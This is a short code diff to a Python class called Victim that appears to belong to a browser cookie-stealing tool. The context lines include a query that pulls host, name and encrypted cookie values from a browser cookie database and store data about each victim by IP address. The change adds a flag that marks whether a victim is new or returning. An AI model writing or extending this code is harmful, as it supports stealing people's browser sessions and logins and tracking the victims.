@@ -13,6 +13,7 @@ class Victim():
     CookiesQuery = "SELECT host_key, path, is_httponly, expires_utc, name, encrypted_value FROM cookies"
     CurrentVictim = {}
     AllVictims = {}
+    IsNew = True
 
     def __init__(self, ip: str) -> None:
         """Initialization of the Victim class"""
@@ -36,6 +37,7 @@ class Victim():
             StorageData = json.load(file)
             if self.ip in StorageData:
                 self.CurrentVictim = StorageData[self.ip]
+                self.IsNew = False
             else:
                 self.CurrentVictim = {"browsers": [], "BrowserCount": 0}
             self.AllVictims = StorageData
